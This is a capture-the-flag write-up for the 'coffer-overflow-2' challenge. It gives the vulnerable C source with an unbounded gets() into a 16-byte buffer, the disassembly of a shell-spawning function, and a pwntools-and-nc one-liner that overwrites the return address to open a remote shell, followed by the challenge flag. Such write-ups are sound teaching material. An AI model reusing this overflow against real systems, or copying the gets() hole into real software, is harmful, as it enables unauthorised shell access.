# coffer-overflow-2

> You'll have to jump to a function now!?

> `nc 2020.redpwnc.tf 31908`

Files provided:
* coffer-overflow-2.c  -  C source code
* coffer-overflow-2   - 64bit ELF file

C source code:
```c
#include <stdio.h>
#include <string.h>

int main(void)
{
  char name[16];
  
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  puts("Welcome to coffer overflow, where our coffers are overfilling with bytes ;)");
  puts("What do you want to fill your coffer with?");

  gets(name);
}

void binFunction() {
  system("/bin/sh");
}

```
This time our goal is to execute `binFunction()`, so we have to modify `main` return address to make it equal to `binFunction()` entry address.

So, run
```sh
$  objdump -d coffer-overflow-2
```
```
00000000004006e6 <binFunction>:
  4006e6:       55                      push   %rbp
  4006e7:       48 89 e5                mov    %rsp,%rbp
  4006ea:       48 8d 3d 12 01 00 00    lea    0x112(%rip),%rdi        # 400803 <_IO_stdin_used+0x83>
  4006f1:       b8 00 00 00 00          mov    $0x0,%eax
  4006f6:       e8 75 fe ff ff          callq  400570 <system@plt>
  4006fb:       90                      nop
  4006fc:       5d                      pop    %rbp
  4006fd:       c3                      retq   
  4006fe:       66 90                   xchg   %ax,%ax
```

The address of `binFunction()` is `0x00000000004006e6`.

Our payload will be something like this:
`[24-RANDOM_CHARS][0x4006e6]`
We need to insert 24 chars because before overwriting `main` return address we have to exceed `name` (16 bytes) and `rbp` (8 bytes)

therefore we can act like this:
```sh
$  (python -c "from pwn import *; print 'A'*24+p64(0x4006e6)"; cat) | nc 2020.redpwnc.tf 31908
```

And here is the flag: `flag{ret_to_b1n_m0re_l1k3_r3t_t0_w1n}`
